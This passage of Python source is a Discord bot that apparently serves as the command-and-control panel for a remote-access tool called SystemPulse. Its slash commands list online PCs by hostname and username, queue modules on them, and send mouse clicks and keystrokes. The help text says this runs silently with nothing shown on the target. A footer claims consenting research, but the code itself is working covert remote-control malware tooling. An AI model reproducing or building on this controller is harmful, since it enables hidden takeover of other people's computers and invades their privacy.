        name="5 · Mouse & keyboard",
        value=(
            "`/controlfromdiscord mouse` — move or click at x,y\n"
            "`/controlfromdiscord keyboard` — type text or press a key\n"
            "Runs silently on their PC (nothing shown in the exe)"
        ),
        inline=False,
    )
    embed.add_field(
        name="Quick reference",
        value=(
            "`/help` — this guide\n"
            "`/pulse guide` — logging commands only\n"
            "`/pulse stats` — API totals\n"
            "`/controlfromdiscord online` — online PCs\n"
            "`/controlfromdiscord run` — trigger module\n"
            "`/controlfromdiscord mouse` — mouse control\n"
            "`/controlfromdiscord keyboard` — keyboard control"
        ),
        inline=False,
    )
    embed.add_field(
        name="Commands not showing?",
        value=(
            "Run **`/pulse sync`** (admin) in this server — commands update in seconds.\n"
            "Or set `GUILD_IDS=your_server_id` on Railway and redeploy the bot."
        ),
        inline=False,
    )
    embed.set_footer(text="SystemPulse AV Research · consenting participants only")
    await interaction.response.send_message(embed=embed, ephemeral=True)


@controlfromdiscord.command(name="setup", description="Use this channel for remote control")
@app_commands.guild_only()
async def cfd_setup(interaction: discord.Interaction) -> None:
    gid = _guild_id(interaction)
    if not gid or interaction.channel_id is None:
        await interaction.response.send_message("Guild channel required.", ephemeral=True)
        return
    watch = store.watches.get(gid)
    if not watch:
        watch = GuildWatch(channel_id=interaction.channel_id)
        store.watches[gid] = watch
    watch.control_channel_id = interaction.channel_id
    await store.persist()
    await interaction.response.send_message(
        f"Control channel set to {interaction.channel.mention}.\n"
        "Online PCs with **SystemPulse.exe** open will appear in `/controlfromdiscord online`.",
        ephemeral=True,
    )


@controlfromdiscord.command(name="online", description="List PCs running SystemPulse right now")
@app_commands.guild_only()
async def cfd_online(interaction: discord.Interaction) -> None:
    gid = _guild_id(interaction)
    if not gid:
        return
    try:
        hosts = await _fetch_online_hosts()
    except httpx.HTTPError as exc:
        await interaction.response.send_message(f"API error: {exc}", ephemeral=True)
        return

    embed = discord.Embed(
        title="Online SystemPulse endpoints",
        description="PCs heartbeat while SystemPulse.exe is open.",
        color=PULSE_COLOR,
    )
    if not hosts:
        embed.add_field(
            name="No one online",
            value="Have someone open **SystemPulse.exe** (no scan required).",
            inline=False,
        )
    else:
        lines = []
        for h in hosts[:15]:
            lines.append(f"**{h.get('hostname', '?')}** — `{h.get('username', '—')}`")
        embed.add_field(name=f"{len(hosts)} online", value="\n".join(lines), inline=False)
        embed.set_footer(text="Use /controlfromdiscord run, mouse, or keyboard")
    await interaction.response.send_message(embed=embed, ephemeral=True)


@controlfromdiscord.command(name="run", description="Queue a module on an online PC")
@app_commands.describe(hostname="PC name (must be online)", module="AV test module to run")
@app_commands.autocomplete(hostname=_hostname_autocomplete)
@app_commands.choices(module=REMOTE_MODULE_CHOICES)
@app_commands.guild_only()
async def cfd_run(
    interaction: discord.Interaction,
    hostname: str,
    module: str,
) -> None:
    label = MODULE_LABELS.get(module, module)
    await _queue_command(
        interaction,
        hostname,
        module=module,
        command_kind="module",
        summary=f"queued module `{label}` — results in `/pulse link` channel",
    )


MOUSE_ACTION_CHOICES = [
    app_commands.Choice(name="Move cursor", value="move"),
    app_commands.Choice(name="Left click", value="click"),
    app_commands.Choice(name="Right click", value="rightclick"),
    app_commands.Choice(name="Double click", value="doubleclick"),
]


@controlfromdiscord.command(name="mouse", description="Move or click the mouse on an online PC")
@app_commands.describe(
    hostname="PC name (must be online)",
    x="Screen X coordinate",
    y="Screen Y coordinate",
    action="What to do at that position",
)
@app_commands.autocomplete(hostname=_hostname_autocomplete)
@app_commands.choices(action=MOUSE_ACTION_CHOICES)
@app_commands.guild_only()
async def cfd_mouse(
    interaction: discord.Interaction,
    hostname: str,
    x: app_commands.Range[int, 0, 10000],
    y: app_commands.Range[int, 0, 10000],
    action: str = "click",
) -> None:
    if action == "move":
        payload = {"action": "move", "x": x, "y": y}
        summary = f"mouse move → ({x}, {y})"
    elif action == "rightclick":
        payload = {"action": "click", "x": x, "y": y, "button": "right", "clicks": 1}
        summary = f"right click → ({x}, {y})"
    elif action == "doubleclick":
        payload = {"action": "click", "x": x, "y": y, "button": "left", "clicks": 2}
        summary = f"double click → ({x}, {y})"
    else:
        payload = {"action": "click", "x": x, "y": y, "button": "left", "clicks": 1}
        summary = f"left click → ({x}, {y})"

    await _queue_command(
        interaction,
        hostname,
        command_kind="input",
        payload=payload,
        summary=summary,
    )


@controlfromdiscord.command(name="keyboard", description="Type text or press a key on an online PC")
@app_commands.describe(
    hostname="PC name (must be online)",
    text="Text to type (leave empty if using key)",
    key="Single key: enter, tab, esc, space, backspace, up, down, …",
)
@app_commands.autocomplete(hostname=_hostname_autocomplete)
@app_commands.guild_only()
async def cfd_keyboard(
    interaction: discord.Interaction,
    hostname: str,
    text: str | None = None,
    key: str | None = None,
) -> None:
    if text and key:
        await interaction.response.send_message(
            "Use either `text` or `key`, not both.", ephemeral=True
        )
        return
    if not text and not key:
        await interaction.response.send_message(
            "Provide `text` to type or `key` to press (e.g. enter, tab).", ephemeral=True
        )
        return

    if text:
        payload = {"action": "type", "text": text}
        preview = text if len(text) <= 40 else text[:37] + "…"
        summary = f"keyboard type `{preview}`"
    else:
        payload = {"action": "key", "key": key or ""}
        summary = f"keyboard key `{key}`"

    await _queue_command(
        interaction,
        hostname,
        command_kind="input",
        payload=payload,
        summary=summary,
    )


@bot.event
async def on_guild_join(guild: discord.Guild) -> None:
    try:
        await sync_guild_commands(guild)
    except discord.HTTPException as exc:
        print(f"[bot] Sync on join failed {guild.id}: {exc}")


@bot.event
async def on_ready() -> None:
    global _poll_task
    if http_client is not None:
        await store.load_from_api()
    print(f"[bot] Logged in as {bot.user} ({len(store.watches)} guild watch(es))")
    if _poll_task is None or _poll_task.done():
        _poll_task = asyncio.create_task(poll_events())


async def main() -> None:
    global http_client

    if not DISCORD_TOKEN:
        raise SystemExit("DISCORD_TOKEN is required")
    if not API_URL:
        raise SystemExit("API_URL is required")

    http_client = httpx.AsyncClient(timeout=15.0)
    await store.load_from_api()
    await bot.start(DISCORD_TOKEN)


if __name__ == "__main__":
    asyncio.run(main())
